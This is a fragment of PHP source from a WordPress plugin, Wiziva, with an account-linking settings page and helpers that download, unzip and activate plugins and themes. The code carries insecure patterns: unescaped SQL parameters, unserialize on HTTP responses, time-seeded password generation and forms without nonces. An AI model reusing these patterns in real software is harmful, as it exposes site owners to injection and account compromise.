			$accexists = file_get_contents(Wiziva_API_URL."/api.php?op=accountexists&email={$user->user_email}");
			if ($accexists) {
				$autolink = "
					<form method='post'>
						<input type='hidden' name='dolink' value='1' />
						<h2>Link to Your existing Wiziva.com Account</h2>
						<table cellpadding=5>
							<tr><td>Wiziva Email or Username:</td><td><input type='text' name='email' style='width: 250px;' value='{$user->user_email}' /></td></tr>
							<tr><td>Wiziva Password:</td><td><input type='password' name='pass' style='width: 250px;' value='' /></td></tr>
							<tr><td></td><td><input class='button-primary' type='submit' name='GoLink' value='".__('Link Your Wiziva.com Account')."' /></td></tr>
						</table><br />
					</form><br /><br />
				";
			}
			else {
				$autolink = "
					<form method='post'>
						<input type='hidden' name='docreateacc' value='1' />
						<h2>Automatically Link with Wiziva.com</h2>
						<table cellpadding=5>
							<tr><td>Email:</td><td><input type='text' name='email' style='width: 250px;' value='{$user->user_email}' /></td></tr>
							<tr><td>Wiziva Username:</td><td><input type='text' name='username' style='width: 250px;' value='{$user->user_login}' /></td></tr>
							<tr><td></td><td><input class='button-primary' type='submit' name='GoCreate' value='".__('Create Wiziva.com Account and Link')."' /></td></tr>
						</table><br />
						<small>We will generate a password for you and you will receive an email message with your login details.<br />
						You have the option to change your initial password once you login to our site.</small>
					</form><br /><br />
				";
				$autonote = "But while we love to automate and make everything quick and easy you can have your account created and linked with this installation with a single click of the button.<br /><br />";
			}
		}
		echo "
			<div class='wrap'>
				<div id='icon-tools' class='icon32'></div>
				<h2>Wiziva Settings &nbsp;<a href='admin.php?page=wiziva' class='button add-new-h2'>Back to Dashboard</a></h2>
				$msg
				<div style='padding: 10px 30px 10px 0;'>
					If you're not familiar with the Wiziva project please read the \"About\" section below, before you make any changes to these settings.<br /><br />
					$autolink
					<form method='post'>
						<h2>Manually Enter Security Hash</h2>
						Do this manually if you're a member at Wiziva.com and you read our guides about the<br />
						Security Hash and how we link your Wiziva account with your WordPress installation.<br /><br />
						<input type='hidden' name='dosettings' value='1' />
						Security Hash: <input type='text' name='hash' style='width: 150px;' value='$val' /> &nbsp; <a href='admin.php?page=wiziva&newcode=1' title='Generate New Code'><img src='".Wiziva_URL."/images/refresh.png' align='absmiddle' alt='Generate New Code' title='Generate New Code' style='border: 0;' /></a> &nbsp; 
						<input class='button-primary' type='submit' name='GoSave' value='".__('Save')."' />
					</form><br /><br />

					<h2>About Wiziva</h2>
					Wiziva is a packing and installation platform for WordPress.<br />
					Within your Admin Dashboard you can manage a portfolio of your favorite plugins and easily install them in bulk.<br />
					You can put all that in the cloud and access your portfolio from every WordPress installation you may have.<br />
					And Wiziva is far more than just that - <a href='http://wiziva.com' target='_blank'>click here</a> to see more about the project.<br /><br />
					The \"Security Hash\" above is used to link your WordPress installation (through the Wiziva plugin) with your account at Wiziva.com.<br />
					This link will enable all the other powerfull features, including the portable portfolio.<br /><br />
					These security settings are needed only if you're a member on our site.<br />
					You can join for free here: <a href='http://wiziva.com' target='_blank'>Wiziva</a><br />
					$autonote
				</div>
			</div>
		";
	}

	function generate_password($size=32, $seed="", $type="") {
		$password = '';
		if ($seed == "")  $seed = time();
		$alpha = "AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz";
		$num = "0123456789";
		$misc = '-_!@#&^*%$=';
		srand($seed);
		switch ($type) {
			case "alpha":
				for($i = 1; $i <= $size; $i++) $password .= $alpha{rand(0, 51)};
				return $password;
			break;
			case "num":
				for($i = 1; $i <= $size; $i++) $password .= $num{rand(0, 9)};
				return $password;
			break;
			default:
				for($i = 1; $i <= $size; $i++) {
					if($num{rand(0,9)} > 8) $password .= $misc{rand(0, 10)};
					elseif($num{rand(0,9)} > 3) $password .= $alpha{rand(0, 51)};
					else $password .= $num{rand(0, 9)};
				}
				return $password;
			break;
		}
	}

	function SelUserGroup($fld, $val, $addstr='', $addopt="<option value='0'>[show all]</option>", $new=1) {
		global $wpdb;
		if ($addstr == 'auto') $addstr = " onchange='this.form.submit();'";
		$html = "<span id='selbox$fld'><select class='frminput' style='width: 180px;' name='$fld' id='$fld'$addstr>$addopt";
		$data = $wpdb->get_results("SELECT id, title FROM {$wpdb->prefix}wiziva_groups WHERE 1 ORDER BY title ASC");
		foreach ($data as $k=>$obj) 
			$html .= sprintf("<option value='%s'%s>%s</option>", $obj->id, $val==$obj->id?' selected':'', $obj->title);
		$html .= "</select>";
		$add = $addstr?'&auto=1':'';
		if ($new) $html .= "&nbsp;<img src='".Wiziva_URL."images/edit.gif' class='icon' style='margin-bottom: -3px;' onclick=\"NewSelectable('$fld', 'usergroup');\" /></span><span id='newbox$fld' style='display:none;'><input type='text' id='new_$fld' style='width: 180px;' value='' />&nbsp;<input type='button' id='but_$fld' class='frmbutton' style='width: 70px;'; onclick=\"this.value='saving...';AjaxAction('newselectable&fld=$fld&stype=usergroup$add', '$fld new_$fld');\" />&nbsp;<img src='".Wiziva_URL."images/delete.gif' class='icon' style='margin-bottom: -3px;' onclick=\"AjaxAction('delselectable&fld=$fld&stype=usergroup', '$fld');\" title='Delete Group' />&nbsp;<img src='".Wiziva_URL."images/undo.gif' class='icon' style='margin-bottom: -3px;' onclick=\"CancelNewSelectable('$fld');\" title='Cancel (return to dropdown)' /></span>";
		else $html .= '</span>';
		return $html;
	}

	function AjaxContent(&$content, $addslashes=1) {
		$content = str_replace("\n", '', $content);
		$content = str_replace("\r", '', $content);
		$content = trim($content);
		if ($addslashes) $content = addslashes($content);
	}

	function ImportFromRepository() {
		global $moreops;
		$content = "
			<form method='post' name='importfromrepos' id='importfromrepos'>
				Repository URL: <input type='text' class='frminput' style='width: 350px;' name='reposurl' id='reposurl' value='' /><span id='errbox'></span><br /><br />
				<a href='admin.php?page=wiziva&searchrepo=plugins'>Search For Plugins</a> | 
				<a href='admin.php?page=wiziva&searchrepo=themes'>Search For Themes</a>
			</form>
		";
		$moreops .= "document.getElementById('reposurl').focus();";
		return $content;
	}

	function InstallPlugin($pid, $activate=1) {
		global $wpdb;
		$memdir = getcwd();
		$ptype = $wpdb->get_var("SELECT ptype FROM {$wpdb->prefix}wiziva_plugins WHERE id=$pid");
		if ($ptype == 'plugin') {
			chdir('../wp-content/plugins/');
			$downurl = $wpdb->get_var("SELECT downloadurl FROM {$wpdb->prefix}wiziva_plugins WHERE id=$pid");
			if (strpos($downurl, 'wiziva.com/dpr.php')) {
				$hash = get_settings('wiziva_hash');
				$downurl = str_replace('{hash}', $hash, $downurl);
				$zipfname = $wpdb->get_var("SELECT title FROM {$wpdb->prefix}wiziva_plugins WHERE id=$pid");
				$zipfname = strtolower(str_replace(' ', '_', $zipfname));
				$zipfname = str_replace('/', '_', $zipfname).'.zip';
			}
			else $zipfname = substr($downurl, strrpos($downurl, '/')+1);
			if (!$this->DownloadFile($downurl, $zipfname)) return false;
			$this->unzip($zipfname);
			@unlink($zipfname);
			if ($activate) {
				$pluginname = $wpdb->get_var("SELECT title FROM {$wpdb->prefix}wiziva_plugins WHERE id=$pid");
				$plugfile = $this->get_plugin_file($pluginname);
				require_once(ABSPATH .'/wp-admin/includes/plugin.php');
				$result = activate_plugin($plugfile);
			}
		}
		if ($ptype == 'theme') {
			chdir('../wp-content/themes/');
			$downurl = $wpdb->get_var("SELECT downloadurl FROM {$wpdb->prefix}wiziva_plugins WHERE id=$pid");
			if (strpos($downurl, 'wiziva.com/dpr.php')) {
				$hash = get_settings('wiziva_hash');
				$downurl = str_replace('{hash}', $hash, $downurl);
				$zipfname = $wpdb->get_var("SELECT title FROM {$wpdb->prefix}wiziva_plugins WHERE id=$pid");
				$zipfname = strtolower(str_replace(' ', '_', $zipfname));
				$zipfname = str_replace('/', '_', $zipfname).'.zip';
			}
			else $zipfname = substr($downurl, strrpos($downurl, '/')+1);
			if (!$this->DownloadFile($downurl, $zipfname)) return false;
			$this->unzip($zipfname);
			@unlink($zipfname);
			//??? activate theme
		}
		chdir($memdir);
	}

	function plxRound($num, $accuracy=2) {
		$ret = round($num, $accuracy);
		if ($accuracy) {
			$pos = strpos($ret, '.');
			if (!$pos) {
				$lenpart = 0;
				$ret .= '.';
			}
			else $lenpart = strlen(substr($ret, $pos))-1;
			if ($accuracy>$lenpart) $ret .= str_repeat('0', $accuracy-$lenpart);
		}
		return $ret;
	}

	function NoQuotes(&$var) {
		$var = str_replace("'", '', $var);
		$var = str_replace('"', '', $var);
	}

	function Msg_OK($msg, $width='', $setget='') {
		if ($setget) $_GET['focus'] = $setget;
		if ($width) $width = 'width: '.$width.'px';
		return "<div class='msg_ok' style='$width'>$msg</div>";

	}

	function Msg_Err($msg, $width='', $setget='') {
		if ($setget) $_GET['focus'] = $setget;
		if ($width) $width = 'width: '.$width.'px';
		return "<div class='msg_err' style='$width'>$msg</div>";
	}

	function GetPluginDetailsFromRepo($slug) {
		$pluginfo = array();
		$args = (object)array('slug'=>$slug);
		$request = array('action'=>'plugin_information', 'timeout'=>30, 'request'=>serialize($args));
		$url = 'http://api.wordpress.org/plugins/info/1.0/';
		$ret = $this->httpPost($url, $request);
		//echo $ret;
		$plugin_info = unserialize($ret);
		$pluginfo['lastupdate'] = StrToTime($plugin_info->last_updated);
		$pluginfo['title'] = $plugin_info->name;
		$pluginfo['url'] = isset($_POST['reposurl'])?$_POST['reposurl']:"https://wordpress.org/plugins/$slug/";
		$pluginfo['reposurl'] = "https://wordpress.org/plugins/$slug/";
		$pluginfo['version'] = $plugin_info->version;
		$pluginfo['author'] = strip_tags($plugin_info->author);
		$pluginfo['aurl'] = strpos($plugin_info->author, 'href="')?$this->GetBetweenTags($plugin_info->author, 'href="', '"'):'';
		$pluginfo['license'] = isset($plugin_info->license)?$plugin_info->license:'';
		$pluginfo['lurl'] = (isset($plugin_info->license) && strpos($plugin_info->license, 'href="'))?$this->GetBetweenTags($plugin_info->author, 'href="', '"'):'';
		$pluginfo['description'] = strip_tags($plugin_info->sections['description']);
		$pluginfo['tags'] = '';
		if (isset($plugin_info->tags)) {
			$stub = $plugin_info->tags;
			foreach ($stub as $k=>$tag) $pluginfo['tags'] .= $tag.', ';
			$pluginfo['tags'] = trim($pluginfo['tags'], ', ');
		}
		$pluginfo['downloadurl'] = $plugin_info->download_link;
		//print_r($pluginfo);
		return $pluginfo;
	}

	function GetThemeDetailsFromRepo($slug) {
		$pluginfo = array();
		$args = (object)array('slug'=>$slug);
		$request = array('action'=>'theme_information', 'timeout'=>30, 'request'=>serialize($args));
		$url = 'http://api.wordpress.org/themes/info/1.0/';
		$ret = $this->httpPost($url, $request);
		$plugin_info = unserialize($ret);
		$pluginfo['title'] = $plugin_info->name;
		$pluginfo['screenshot'] = $plugin_info->screenshot_url;
		$pluginfo['preview'] = $plugin_info->preview_url;
		$pluginfo['lastupdate'] = StrToTime($plugin_info->last_updated);
		$pluginfo['url'] = isset($plugin_info->homepage)?$plugin_info->homepage:"https://wordpress.org/themes/$slug";
		$pluginfo['reposurl'] = "https://wordpress.org/themes/$slug";
		$pluginfo['version'] = $plugin_info->version;
		$pluginfo['author'] = strip_tags($plugin_info->author);
		$pluginfo['aurl'] = strpos($plugin_info->author, 'href="')?$this->GetBetweenTags($plugin_info->author, 'href="', '"'):'';
		$pluginfo['license'] = isset($plugin_info->license)?$plugin_info->license:'';
		$pluginfo['lurl'] = (isset($plugin_info->license) && strpos($plugin_info->license, 'href="'))?$this->GetBetweenTags($plugin_info->author, 'href="', '"'):'';
		$pluginfo['description'] = strip_tags($plugin_info->sections['description']);
		$pluginfo['tags'] = '';
		if (isset($plugin_info->tags)) {
			$stub = $plugin_info->tags;
			foreach ($stub as $k=>$tag) $pluginfo['tags'] .= $tag.', ';
			$pluginfo['tags'] = trim($pluginfo['tags'], ', ');
		}
		$pluginfo['downloadurl'] = $plugin_info->download_link;
		return $pluginfo;
	}


	function httpPost($url, $fields='') {
		$curl_handle = curl_init();
		curl_setopt($curl_handle, CURLOPT_POST, 1);
		curl_setopt($curl_handle, CURLOPT_URL, $url);
		curl_setopt($curl_handle, CURLOPT_CONNECTTIMEOUT, 30);
		curl_setopt($curl_handle, CURLOPT_RETURNTRANSFER, 1);
		if ($fields) curl_setopt($curl_handle, CURLOPT_POSTFIELDS, $fields);
		$buffer = curl_exec($curl_handle);
		curl_close($curl_handle);
		return $buffer;
	}

	function get_plugin_file( $plugin_name ) {
		require_once( ABSPATH . '/wp-admin/includes/plugin.php' );
		$plugins = get_plugins();
		foreach( $plugins as $plugin_file => $plugin_info ) {
			if ( $plugin_info['Name'] == $plugin_name ) return $plugin_file;
		}
		return null;
	}

	function DownloadFile($url, $fn) {
		$content = file_get_contents($url);
		if (!$content) return false;
		$fh = fopen($fn, 'wb');
		fwrite($fh, $content);
		fclose($fh);
		return true;
	}

	function getURL($command) {
		return file_get_contents($command);
	}

}

?>